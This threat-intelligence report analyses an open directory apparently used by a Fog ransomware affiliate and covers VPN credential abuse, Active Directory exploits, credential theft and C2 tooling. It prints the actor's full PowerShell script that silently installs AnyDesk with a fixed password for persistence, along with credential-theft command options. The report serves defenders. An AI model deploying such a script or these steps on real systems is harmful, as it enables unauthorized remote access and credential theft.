# Navigating Through The Fog - The DFIR Report

- **Source :** dfir-report
- **URL :** https://thedfirreport.com/2025/04/28/navigating-through-the-fog/
- **Date :** April 28, 2025

---

![](https://thedfirreport.com/wp-content/uploads/fg2-scaled-1.jpg)

[ransomware](https://thedfirreport.com/category/ransomware/)

# Navigating Through The Fog

April 28, 2025 

### Key Takeaways

  * An open directory associated with a ransomware affiliate, likely linked to the Fog ransomware group, was discovered in December 2024. It contained tools and scripts for reconnaissance, exploitation, lateral movement, and persistence.
  * Initial access was gained using compromised SonicWall VPN credentials, while other offensive tools facilitated credential theft, exploitation of Active Directory vulnerabilities, and lateral movement.
  * Persistence was maintained through AnyDesk, automated by a PowerShell script that preconfigured remote access credentials.
  * Sliver C2 executables were hosted on the server for command-and-control operations, alongside Proxychains tunneling.
  * The victims spanned multiple industries, including technology, education, and logistics, across Europe, North America, and South America, highlighting the affiliate’s broad targeting scope.


  * [Private Threat Briefs](https://thedfirreport.com/services/threat-intelligence/#threat-brief): 20+ private DFIR reports annually.
  * [Threat Feed](https://thedfirreport.com/services/threat-intelligence/#threat-feed): Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.
  * [All Intel](https://thedfirreport.com/services/threat-intelligence/#all-intel): Includes everything from Private Threat Briefs and Threat Feed, plus private events, Threat Actor Insights reports, long-term tracking, data clustering, and other curated intel.
  * [Private Sigma Ruleset](https://thedfirreport.com/services/detection-rules/): Features 180+ Sigma rules derived from 50+ cases, mapped to ATT&CK with test examples.
  * [DFIR Labs](https://thedfirreport.com/services/dfir-labs/): Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.

## [Case Summary](/#case-summary)

The DFIR Report’s Threat Intel Group identified an open directory in December 2024, hosted at 194.48.154.79:80. The directory was likely linked to a ransomware operator associated with the Fog group, first observed in mid-2024. Analysis of its contents revealed a comprehensive toolkit used for reconnaissance, exploitation, credential theft, and command-and-control activities.

Among the tools were SonicWall Scanner for exploiting VPN credentials, DonPAPI for extracting Windows DPAPI-protected credentials, Certipy for abusing Active Directory Certificate Services (AD CS), Zer0dump, and Pachine/noPac for exploiting Active Directory vulnerabilities like CVE-2020-1472.

The affiliate also leveraged AnyDesk for persistence through an automated PowerShell script and hosted Sliver C2 components on the server for managing implants. Proxychains and Powercat were used to facilitate stealthy lateral movement and reverse shells. Victim data found in the directory indicated targets across multiple industries, including technology, education, and logistics, with a geographic focus on Italy, Greece, Brazil, and the USA.

Further information about Fog ransomware can be found at the following blog posts: [Arctic Wolf](https://arcticwolf.com/resources/blog/lost-in-the-fog-a-new-ransomware-threat/), [SentinelOne](https://www.sentinelone.com/anthology/fog/) and [any.run](https://any.run/malware-trends/fog/).

## [Analysts](/#analysts)

Analysis and reporting completed by [Angelo_Violetti](https://www.linkedin.com/in/angelo-violetti/), and reviewed by [Zach Stanford](https://www.linkedin.com/in/zach-stanford-57733296/).

## [Adversary](/#adversary)

The DFIR Report’s Threat Intel Group assesses with moderate confidence the open directory was used by an affiliate of the Fog ransomware group based on:

    * Evidence of victims being compromised in the open directory that later appeared on Fog Ransomware’s Dedicated Leak Site (DLS)
    * Community notes on VirusTotal for the IP address

In a saved open-directory content retrieved through fofa.info, there is a folder called ouroverde.net.br which is a threat actor’s victim.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_001.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_001.png)
    
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Directory listing for /</title>
    </head>
    <body>
    <h1>Directory listing for /</h1>
    <hr>
    <ul>
    <li><a href=".bash_history">.bash_history</a></li>
    <li><a href=".bashrc">.bashrc</a></li>
    <li><a href=".cache/">.cache/</a></li>
    <li><a href=".config/">.config/</a></li>
    <li><a href=".gnupg/">.gnupg/</a></li>
    <li><a href=".local/">.local/</a></li>
    <li><a href=".nxc/">.nxc/</a></li>
    <li><a href=".profile">.profile</a></li>
    <li><a href=".sliver/">.sliver/</a></li>
    <li><a href=".sliver-client/">.sliver-client/</a></li>
    <li><a href=".ssh/">.ssh/</a></li>
    <li><a href=".wget-hsts">.wget-hsts</a></li>
    <li><a href=".Xauthority">.Xauthority</a></li>
    <li><a href=".xorgxrdp.10.log">.xorgxrdp.10.log</a></li>
    <li><a href=".xsession-errors">.xsession-errors</a></li>
    <li><a href="20241121150831_Certipy.zip">20241121150831_Certipy.zip</a></li>
    <li><a href="any.ps1">any.ps1</a></li>
    <li><a href="AnyDesk.exe">AnyDesk.exe</a></li>
    <li><a href="Certipy/">Certipy/</a></li>
    <li><a href="Desktop/">Desktop/</a></li>
    <li><a href="Documents/">Documents/</a></li>
    <li><a href="DonPAPI-1.0.0/">DonPAPI-1.0.0/</a></li>
    <li><a href="Downloads/">Downloads/</a></li>
    <li><a href="Music/">Music/</a></li>
    <li><a href="noPac/">noPac/</a></li>
    <li><a href="orpheus/">orpheus/</a></li>
    <li><a href="ouroverde.net.br/">ouroverde.net.br/</a></li>
    <li><a href="Pachine/">Pachine/</a></li>
    <li><a href="Pictures/">Pictures/</a></li>
    <li><a href="powercat.ps1">powercat.ps1</a></li>
    <li><a href="Public/">Public/</a></li>
    <li><a href="sliver-client_linux">sliver-client_linux</a></li>
    <li><a href="sliver-client_linux.sig">sliver-client_linux.sig</a></li>
    <li><a href="sliver-server">sliver-server</a></li>
    <li><a href="sliver-server_linux.sig">sliver-server_linux.sig</a></li>
    <li><a href="slv.bin">slv.bin</a></li>
    <li><a href="snap/">snap/</a></li>
    <li><a href="sonic_scan/">sonic_scan/</a></li>
    <li><a href="sonic_scan.zip">sonic_scan.zip</a></li>
    <li><a href="Templates/">Templates/</a></li>
    <li><a href="thinclient_drives/">thinclient_drives/</a></li>
    <li><a href="v1.0.0.zip">v1.0.0.zip</a></li>
    <li><a href="Videos/">Videos/</a></li>
    <li><a href="zer0dump/">zer0dump/</a></li>
    </ul>
    <hr>
    </body>
    </html>
    

This company is listed in the Fog’s data leak site, as shown in the following image.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_002.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_002.png)

The internal domain of “fourlis.net” was mentioned in bash history of the host which indicated the threat actor had successfully compromised that network.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_003.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_003.png)

While this specific victim did not appear on the data leak site, an [article](https://www.ekathimerini.com/economy/1255232/fourlis-group-hit-by-cyberattack-that-crippled-online-store-operation/) during the same period of time was released:

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_004.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_004.png)

In the comment sections of [VirusTotal](https://www.virustotal.com/gui/ip-address/194.48.154.79/community), a user mentioned that the server was used as a command-and-control server, potentially also for data exfiltration.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_005.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_005.png)

## [Infrastructure](/#infrastructure)

**Sliver:** The threat actor leveraged the server to host [Sliver](https://github.com/BishopFox/sliver) C2, as listed in [ThreatFox](https://threatfox.abuse.ch/ioc/1355779/) and based on the files residing in the open-directory.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_006.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_006.png)

The DFIR Threat Intelligence Group observed this server hosting the Sliver team server port 31337 on **2024-12-11** , but it was not seen again after that first sighting.

In a very close timeframe, another Sliver C2 was deployed in the same ASN, AS62240, which is owned by [Clouvider](https://www.clouvider.com/), a hosting provider. Potentially, the same threat actor bought multiple servers from the same provider to deploy its command-and-control servers. However, no other links beyond the hosting provider and C2 framework were found.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_007.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_007.png)

## [Capabilities](/#capabilities)

### Initial Access

**Valid Account**

**SonicWall Scanner:** The server contained a ZIP file called sonic_scan.zip, in which a Python script and a file, data.txt, with potentially compromised VPN credentials were present, that had the following structure:

    * Target IP Address
    * Username
    * Password
    * Domain Name
    * VPN Software

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_008.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_008.png)

The script sonic_scan/main.py allows the threat actor to authenticate to SonicWall VPN appliances and execute a port scan by performing the following actions:

    * Reads and parses data.txt to get the IP address, username, password and domain name (if any) of the target appliance.
    * For every entry in data.txt, which represents a potential valid account, obtains the domain name associated with the specific IP address and then executes the NetExtender process to login into the target VPN. NetExtender is a SonicWall command-line utility which allows access a VPN server. Specifically, NetExtender is executed via this command-line: netextender <target IP address> –username <target username> –password <username password> –domain <target domain name> –always-trust .
    * After the execution of NetExtender, the script parses the output produced by the VPN and, if the connection was successful, a loop is initiated until the string “NetExtender connected successfully” is found. During this loop, IP addresses are extracted and appended to a list which is then provided to Nmap for port scanning.
    * Once the Nmap scan is completed, the NetExtender process is terminated.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_009.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_009.png)

[Arctic Wolf](https://arcticwolf.com/resources/blog/arctic-wolf-labs-observes-increased-fog-and-akira-ransomware-activity-linked-to-sonicwall-ssl-vpn/) also linked the usage of compromised SonicWall credentials to Fog Ransomware.

### Lateral Movement

**Remote Services: SMB/Windows Admin Shares**

**NetExec:** NetExec is a post-exploitation tool that evolved from CrackMapExec. It has multiple features and functionalities for remote command execution, network enumeration and privilege escalation.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_010.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_010.png)

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_011.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_011.png)

### Persistence

**Create or Modify System Process: Windows Service**

**AnyDesk:** To establish persistence on a compromised Windows host, the threat actor leverages the well-known Remote Monitoring and Management (RMM) tool AnyDesk. The PowerShell script “any.ps1” automates the download and installation of AnyDesk, including the setting of the password `Admin#123` to access the RMM.
    
    Function AnyDesk {
    mkdir "C:\ProgramData\AnyDesk"
    # Download AnyDesk
    $clnt = new-object System.Net.WebClient
    $url = "http://download.anydesk.com/AnyDesk.exe"
    $file = "C:\ProgramData\AnyDesk.exe"
    $clnt.DownloadFile($url,$file)
    
    
    # powershell mkdir "C:\ProgramData\AnyDesk"
    # powershell -command "(new-object System.Net.WebClient).DownloadFile('http://download.anydesk.com/AnyDesk.exe', 'C:\ProgramData\AnyDesk.exe')"
    
    
    cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
    
    
    cmd.exe /c echo Admin#123 | C:\ProgramData\anydesk.exe --set-password
    
    
    cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
    
    }
    

A comprehensive description of AnyDesk and all the potential techniques to detect are detailed in [lolrmm.io](http://lolrmm.io).

### Credential Access

**Credentials from Password Stores**

**DonPAPI & Impacket dpapi:** DonPAPI provides functionalities to locate and retrieve Windows Data Protection API (DPAPI) protected credentials from compromised Windows systems, such as:

    * Chromium browser credentials, cookies and tokens.
    * Firefox browser credentials and cookies.
    * Windows certificates.
    * Credential manager.
    * Vaults credentials.

The .bash_history shows that the threat actor employed DonPAPI with the following command-line options:

    * **-pvk <pvk name>.pvk:** specifies the Private Key File (PVK) used to decrypt DPAPI-protected credentials.
    * **–no_vnc:** disables the collection of VNC credentials.
    * **–no_remoteops:** disables the collection of credentials from remote systems.
    * **–GetHashes:** enables the collection of NTLM hashes.
    * **–no_recent:** disables the collection of recent files and documents
    * **–no_sysadmins:** excludes systems administrators from the credential collection process
    * **-o <filename>:** saves the output into a specific folder.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_012.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_012.png)

The threat actor also employs dpapi.py from the Impacket suite to retrieve domain backup keys.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_013.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_013.png)

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_014.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_014.png)

**Steal or Forge Authentication Certificates**

**Certipy:** Certipy is a Python-based tool created for interacting with Active Directory Certificate Services (AD CS), specifically to enumerate, identify and exploit vulnerable certificate templates with the final aim of impersonating high-privileged accounts.

The following image shows how the threat actor launched the find functionality to detect vulnerable AD CS templates.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_015.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_015.png)

**Steal or Forge Kerberos Tickets: Kerberoasting**

**Orpheus:** Orpheus is an offensive Python tool designed by Trustedsec based on Impacket’s GetUserSPNs.py and kerberosv5.py. The tool is built with defense evasion mechanisms since it changes the encryption type from RC4 (eType 23), which is common for Kerberoasting attack, to AES-256 (eType 18) that is usual in legitimate traffic.

Based on the available .bash_history file, the threat actor only downloaded the tool.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_016.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_016.png)

### Privilege Escalation

**Exploitation for Privilege Escalation**

**Zer0dump:** Zer0dump is a Proof-of-Concept (PoC) exploit for Zerologon vulnerability (CVE-2020-1472). The tool allows the compromise of unpatched Domain Controllers to obtain Domain Admins privileges in Active Directory environments.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_017.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_017.png)

The Zerologon exploitation is made by the following steps:

    * Leverages a cryptographic weakness in Netlogon’s AES-CFB8 implementation, which allows a threat actor to bypass authentication by sending Netlogon messages with a ClientCredential field filled with zeros.
    * Resets the Domain Controller’s machine account password to an empty string, effectively granting administrative access to the domain.
    * Integrates with Impacket’s secretsdump.py to extract credentials from the compromised Domain Controller.
    * After exploitation, zer0dump attempts to restore the original machine account password.

**Pachine & noPac:** Pachine and noPac are offensive tools developed to exploit CVE-2021-42278 and CVE-2021-42287 vulnerabilities, allowing privilege escalation in Active Directory. They leverage the Kerberos Privilege Attribute Certificate (PAC) to potentially impersonate a domain administrator starting from a standard domain account.

The Pachine’s scan options enumerate the domain controller to determine if it is vulnerable to CVE-2021-42278.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_018.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_018.png)

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_019.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_019.png)

To exploit the previously mentioned vulnerabilities, noPac requires valid domain account credentials which are abused to obtain a Kerberos ticket that can be leveraged to compromise a domain admin.

The following image shows the usage of noPac to impersonate the domain administrator administrator.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_020.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_020.png)

The main difference between the two tools is that:

    * Pachine adds machine accounts and obtains TGS for specific SPNs.
    * NoPac also provides the capability to drop shells and dump hashes.

### Command & Control

**Proxy**

**Proxychains:** Proxychains is a tool used to route network traffic through proxy servers and it supports multiple types of proxies such as SOCKS4, SOCKS5 and HTTPS. Proxychains can be combined with post-exploitation frameworks (e.g., Sliver, Cobalt Strike, etc.) to route the traffic through the implant.

The following image shows how the threat actor leveraged proxychains to execute Python scripts like certipy or noPac.py from the command and control server into the target environment.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_021.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_021.png)

The following image shows how proxychains works. The tool is very powerful because a threat actor can execute tools from the command-and-control server leaving less footprint compared to the artifacts that could be left if those were run on a monitored system.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_022.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_022.png)

**Application Layer Protocol: Web Protocols**

**Sliver:** There were two binaries associated with Sliver present on the open directory: slv.bin and sliver-client_linux. We also note in the infrastructure section that this IP address was once observed as a Sliver C2.

It was not possible to analyze slv.bin and obtain further information out of the shellcode since it was encrypted. Likely, it was used to connect back to the same Sliver server. The binary sliver-client_linux, is the executable used to connect to a Sliver server, however no further usage of Sliver was observed.

**Protocol Tunneling**

**Powercat:** A copy of Powercat was present on the host as powercat.ps1. Powercat is a PowerShell-based networking tool designed to replicate the functionalities provided by Netcat. It can be used for:

    * Networking communications since it supports both TCP and UDP connections.
    * Bind and reverse shell creation to listen for incoming connections or connect back to a command-and-control server.
    * Data transfer over TCP, UDP and also DNS (dnscat2) which can be useful for evading network detection mechanisms.
    * Payload generation and encoding.
    * Traffic tunnelling to connect to systems that otherwise would be inaccessible.

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_023.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_023.png)

## [Victim](/#victim)

**Countries**

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_024.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_024.png)

All the IP addresses found in the file data.txt, present in the ZIP file sonic_scan.zip, are located in Italy and are associated with AS5602 Retelit Digital Services S.p.A. which is a company that provides IT and cyber security services. Other victims are located in the following countries:

    * Greece
    * USA
    * Brazil

**Industries** The impacted sectors by the threat actor were the following:

    * Technology
    * Education
    * Retail
    * Transportation & Logistics

## [Diamond Model](/#diamond-model)

[![](https://thedfirreport.com/wp-content/uploads/2025/04/34568_025-scaled.png)](https://thedfirreport.com/wp-content/uploads/2025/04/34568_025-scaled.png)




##### Share this entry

  * [Share on Facebook](https://www.facebook.com/sharer.php?u=https://thedfirreport.com/2025/04/28/navigating-through-the-fog/&t=Navigating%20Through%20The%20Fog)
  * [Share on X](https://x.com/share?text=Navigating%20Through%20The%20Fog&url=https://thedfirreport.com/?p=43393)
  * [Share on WhatsApp](https://api.whatsapp.com/send?text=https://thedfirreport.com/2025/04/28/navigating-through-the-fog/)
  * [Share on Linkedin](https://linkedin.com/shareArticle?mini=true&title=Navigating%20Through%20The%20Fog&url=https://thedfirreport.com/2025/04/28/navigating-through-the-fog/)
  * [Share on Reddit](https://reddit.com/submit?url=https://thedfirreport.com/2025/04/28/navigating-through-the-fog/&title=Navigating%20Through%20The%20Fog)
  * [Share by Mail](/cdn-cgi/l/email-protection#47783432252d2224337a0926312e2026332e2920627577132f352832202f627577132f22627577012820616477747f7c2528233e7a2f333337347d6868332f2223212e353522372835336924282a687577757268777368757f682926312e2026332e29206a332f352832202f6a332f226a21282068)